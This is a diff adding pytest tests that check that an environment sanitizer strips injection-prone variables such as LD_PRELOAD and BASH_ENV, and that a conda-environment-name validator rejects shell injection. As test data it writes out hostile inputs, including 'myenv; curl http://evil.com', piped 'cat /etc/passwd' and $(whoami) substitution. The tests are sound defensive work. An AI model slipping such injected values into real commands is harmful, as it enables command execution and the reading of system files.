@@ -19,6 +19,7 @@ from openspace.local_server.subprocess_safety import (
     _DANGEROUS_ENV_VARS,
     create_secure_temp_file,
     sanitize_env,
+    validate_conda_env,
 )
 
 
@@ -235,3 +236,123 @@ class TestDangerousEnvVarsCompleteness:
     ])
     def test_critical_var_in_blocklist(self, var: str):
         assert var in _DANGEROUS_ENV_VARS, f"{var} missing from _DANGEROUS_ENV_VARS"
+
+
+# ---------------------------------------------------------------------------
+# W14: Inherited parent env stripping
+# ---------------------------------------------------------------------------
+
+class TestInheritedEnvStripping:
+    """W14: sanitize_env must strip injection-class vars from inherited env."""
+
+    def test_strips_inherited_ld_preload(self, monkeypatch):
+        """CRIT: LD_PRELOAD in parent env must be stripped."""
+        monkeypatch.setenv("LD_PRELOAD", "/tmp/evil.so")
+        result = sanitize_env(None)
+        assert "LD_PRELOAD" not in result
+
+    def test_strips_inherited_bash_env(self, monkeypatch):
+        """HIGH: BASH_ENV in parent env must be stripped."""
+        monkeypatch.setenv("BASH_ENV", "/tmp/evil.sh")
+        result = sanitize_env(None)
+        assert "BASH_ENV" not in result
+
+    def test_strips_inherited_dyld(self, monkeypatch):
+        """CRIT: DYLD_INSERT_LIBRARIES in parent env must be stripped."""
+        monkeypatch.setenv("DYLD_INSERT_LIBRARIES", "/tmp/evil.dylib")
+        result = sanitize_env(None)
+        assert "DYLD_INSERT_LIBRARIES" not in result
+
+    def test_strips_inherited_bash_func(self, monkeypatch):
+        """HIGH: BASH_FUNC_* in parent env must be stripped."""
+        monkeypatch.setenv("BASH_FUNC_evil%%", "() { cat /etc/passwd; }")
+        result = sanitize_env(None)
+        assert "BASH_FUNC_evil%%" not in result
+
+    def test_strips_inherited_pythonpath(self, monkeypatch):
+        """HIGH: PYTHONPATH in parent env must be stripped."""
+        monkeypatch.setenv("PYTHONPATH", "/tmp/evil")
+        result = sanitize_env(None)
+        assert "PYTHONPATH" not in result
+
+    def test_strips_inherited_node_options(self, monkeypatch):
+        """HIGH: NODE_OPTIONS in parent env must be stripped."""
+        monkeypatch.setenv("NODE_OPTIONS", "--require=/tmp/evil.js")
+        result = sanitize_env(None)
+        assert "NODE_OPTIONS" not in result
+
+    def test_preserves_path_in_base(self, monkeypatch):
+        """PATH must be preserved in the base environment."""
+        monkeypatch.setenv("PATH", "/usr/bin:/bin")
+        result = sanitize_env(None)
+        assert "PATH" in result
+
+    def test_preserves_shell_in_base(self, monkeypatch):
+        """SHELL must be preserved in the base environment."""
+        monkeypatch.setenv("SHELL", "/bin/bash")
+        result = sanitize_env(None)
+        assert "SHELL" in result
+
+    def test_preserves_home_in_base(self, monkeypatch):
+        """HOME must be preserved in the base environment."""
+        monkeypatch.setenv("HOME", "/home/user")
+        result = sanitize_env(None)
+        assert "HOME" in result
+
+
+# ---------------------------------------------------------------------------
+# W14: Conda environment name validation
+# ---------------------------------------------------------------------------
+
+class TestCondaEnvValidation:
+    """W14: validate_conda_env must prevent shell injection."""
+
+    def test_valid_simple_name(self):
+        assert validate_conda_env("myenv") == "myenv"
+
+    def test_valid_name_with_dots_dashes(self):
+        assert validate_conda_env("my-env.2.0") == "my-env.2.0"
+
+    def test_valid_name_with_underscores(self):
+        assert validate_conda_env("my_env_v3") == "my_env_v3"
+
+    def test_empty_returns_none(self):
+        assert validate_conda_env("") is None
+        assert validate_conda_env(None) is None
+
+    def test_rejects_semicolon_injection(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("myenv; curl http://evil.com")
+
+    def test_rejects_pipe_injection(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("myenv | cat /etc/passwd")
+
+    def test_rejects_backtick_injection(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("myenv`whoami`")
+
+    def test_rejects_dollar_injection(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("myenv$(whoami)")
+
+    def test_rejects_space_injection(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("my env")
+
+    def test_rejects_newline_injection(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("myenv\nwhoami")
+
+    def test_rejects_slash_traversal(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("../../../etc/passwd")
+
+    def test_rejects_too_long_name(self):
+        with pytest.raises(ValueError):
+            validate_conda_env("a" * 129)
+
+    def test_rejects_leading_dash(self):
+        """Leading dash could be interpreted as option flag."""
+        with pytest.raises(ValueError):
+            validate_conda_env("-malicious")
